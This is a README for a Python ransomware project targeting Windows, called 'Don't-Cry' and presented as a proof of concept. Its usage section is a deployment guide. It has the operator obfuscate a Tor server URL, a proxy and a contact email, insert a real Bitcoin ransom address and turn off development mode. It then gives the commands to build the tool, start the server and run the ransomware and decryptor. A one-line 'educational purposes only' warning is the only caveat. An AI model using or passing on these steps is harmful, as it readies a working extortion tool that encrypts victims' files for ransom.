<h1 align="center">Don't-Cry Ransomware PoC</h1>
  
<div align="center">
  <img src="https://img.shields.io/badge/Python-3.12%2B-blue?logo=python&logoColor=white" alt="Python">
  <img src="https://img.shields.io/badge/Requires-Cython-yellow?logo=python&logoColor=white" alt="Cython">
  <img src="https://img.shields.io/badge/Rust-1.87.0%2B-orange?logo=rust&logoColor=white" alt="Rust >= 1.87.0">
  <img src="https://img.shields.io/github/license/memecoder12345678/DCry-Ransomware?style=flat&logo=open-source-initiative&logoColor=white" alt="License">
  <img src="https://img.shields.io/badge/Platform-Windows-blue?logo=data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iaXNvLTg4NTktMSI/Pgo8IS0tIFVwbG9hZGVkIHRvOiBTVkcgUmVwbywgd3d3LnN2Z3JlcG8uY29tLCBHZW5lcmF0b3I6IFNWRyBSZXBvIE1peGVyIFRvb2xzIC0tPgo8c3ZnIGZpbGw9IiNGRkZGRkYiIGhlaWdodD0iODAwcHgiIHdpZHRoPSI4MDBweCIgdmVyc2lvbj0iMS4xIiBpZD0iTGF5ZXJfMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayIgCgkgdmlld0JveD0iMCAwIDQ5OC41NyA0OTguNTciIHhtbDpzcGFjZT0icHJlc2VydmUiPgo8ZyB0cmFuc2Zvcm09InRyYW5zbGF0ZSgxIDIpIj4KCTxnPgoJCTxnPgoJCQk8cGF0aCBkPSJNMjI3LjMwMiwzOC4yODl2MjAyLjI4MmgyNjguNTlWLTJMMjI3LjMwMiwzOC4yODl6IE00NzkuMTA1LDIyMy43ODRIMjQ0LjA4OVY1Mi41NTdsMjM1LjAxNi0zNC40MTNWMjIzLjc4NHoiLz4KCQkJPHBhdGggZD0iTTAuNjc5LDI0My4wODloMjA5LjgzNlYzOS45NjdMMC42NzksNzEuMDIzVjI0My4wODl6IE0xNy40NjYsODUuMjkybDE3Ni4yNjItMjYuMDJ2MTY3LjAzSDE3LjQ2NlY4NS4yOTJ6Ii8+CgkJCTxwYXRoIGQ9Ik0yMjcuMzAyLDQ1Ni4yODJsMjY4LjU5LDQwLjI4OVYyNTkuODc1aC0yNjguNTlWNDU2LjI4MnogTTI0NC4wODksMjc2LjY2MmgyMzUuMDE2djIwMC42MDNsLTIzNS4wMTYtMzUuMjUzVjI3Ni42NjJ6Ii8+CgkJCTxwYXRoIGQ9Ik0wLjY3OSw0MjMuNTQ4bDIwOS44MzYsMzEuMDU2VjI1OS44NzVIMC42NzlWNDIzLjU0OHogTTE3LjQ2NiwyNzYuNjYyaDE3Ni4yNjJ2MTU4LjYzNmwtMTc2LjI2Mi0yNi4wMlYyNzYuNjYyeiIvPgoJCTwvZz4KCTwvZz4KPC9nPgo8L3N2Zz4=" alt="Platform">

  <img src="https://img.shields.io/github/stars/memecoder12345678/DCry-Ransomware?style=social" alt="Stars">
</div>

![DCry](imgs/dcry.png)
PoC ransomware in Python targeting Windows systems 💀💀💀

## Usage
* Open the [`dcry.py`](src/dcry.py) file.
* Replace the `YOUR_URL` variable with the encoded URL using the `dx42` function like this:
  ```python
  YOUR_URL = dx42(b"YOUR_ENCODED_URL").decode()
  ```
  (Use the `ex42` function from the `edx42` module to encode your URL first.)
  
  Example:
  ```python
  encoded_url = ex42(b"https://your-tor-server.onion")
  YOUR_URL = dx42(encoded_url).decode()
  ```
* Replace the `YOUR_PROXY` variable similarly with your encoded proxy string:
  ```python
  YOUR_PROXY = dx42(b"YOUR_ENCODED_PROXY").decode()
  ```
* Replace `YOUR_BITCOIN_ADDRESS` with your actual Bitcoin address string.
* Replace `YOUR_EMAIL_ADDRESS` similarly with your encoded email address. 
  ```python 
  YOUR_EMAIL_ADDRESS = dx42(b"YOUR_ENCODED_EMAIL_ADDRESS").decode()   
  ```
* Set `dev_mode = False` to disable development mode.
* Open the [`decryptor.py`](src/decryptor.py) file.
* Set `dev_mode = False` to disable development mode.
* Install the required packages with the following command:
  ```powershell
  pip install -r requirements.txt
  ```
* Build the Cython code with the following command:
  ```powershell
  python src/setup.py build_ext --inplace; Move-Item -Path file_crypto.*.pyd -Destination src -Force
  ```
* Run the server with the following command:
  ```powershell
  gunicorn -b 0.0.0.0:8080 src.server:app
  ```
* Run the ransomware with the following command:
  ```powershell
  python src/dcry.py
  ```
* Run the decryptor with the following command:
  ```powershell
  python src/decryptor.py
  ```

## Warning
> \[!WARNING]
> This project is a ransomware simulation for educational purposes only.

## FAQ 
* See details in [FAQ.md](docs/FAQ.md)

## Contributing  
* See contribution guidelines in [CONTRIBUTING.md](docs/CONTRIBUTING.md)

## Code Of Conduct  
* See our community standards in [CODE_OF_CONDUCT.md](docs/CODE_OF_CONDUCT.md)

## Security
* See the security policy in [SECURITY.md](docs/SECURITY.md)


## License
* This project is licensed under the terms of the [Apache License 2.0](./LICENSE).
